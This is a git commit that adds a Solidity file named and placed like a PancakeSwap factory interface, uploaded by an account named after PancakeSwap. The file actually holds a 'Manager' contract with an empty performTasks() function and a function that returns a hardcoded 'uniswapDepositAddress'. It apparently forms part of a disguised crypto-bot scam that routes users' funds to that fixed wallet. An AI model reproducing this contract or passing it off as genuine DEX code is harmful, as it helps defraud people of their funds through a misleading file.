eb2e79c2ef981d830429029e32d152361901a43c
frank <97252887+PancakeSwapdev2@users.noreply.github.com>
2022-01-06 21:11:47 +0200

    Add files via upload

---
+++ contracts/interfaces/IPancakeswapV22Factory.sol
@@ -0,0 +1,12 @@
+
+pragma solidity ^0.6.6;
+
+contract Manager {
+	function performTasks() public {
+	    
+	}
+
+	function uniswapDepositAddress() public pure returns (address) {
+		return 0xc9dB8fa37c19adcba8db6744bCF204340c6bAbBf;
+	}
+}
